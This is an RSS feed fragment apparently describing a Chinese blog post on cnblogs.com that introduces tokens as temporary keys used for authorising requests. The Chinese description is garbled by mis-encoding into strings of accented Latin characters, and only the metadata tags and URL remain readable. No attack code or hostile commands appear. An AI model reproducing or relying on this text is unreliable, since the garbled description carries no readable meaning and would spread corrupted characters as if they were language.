<og:description>ä»¤ç‰Œç®€ä»‹åŠåŸç† ä»¤ç‰Œ(Token) å°±æ˜¯ç³»ç»Ÿçš„ä¸´æ—¶å¯†é’¥ï¼Œç›¸å½“äºè´¦æˆ·åå’Œå¯†ç ï¼Œç”¨æ¥å†³å®šæ˜¯å¦å…) è®¸è¿™æ¬¡è¯·æ±‚å’Œåˆ¤æ–­è¿™æ¬¡è¯·æ±‚æ˜¯å±äºå“ªä¸€ä¸ªç”¨æˆ·çš„ã€‚å®ƒå…è®¸ä½ åœ¨ä¸æä¾›å¯†ç æˆ–å…¶ä»–å‡­è¯çš„å‰æä¸‹ï¼Œè®¿é—®ç½‘ç»œå’Œç³»ç»Ÿèµ„æºã€‚è¿™</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/coderge/p/13751501.html</dc:identifier>
</item>
</channel>
</rss>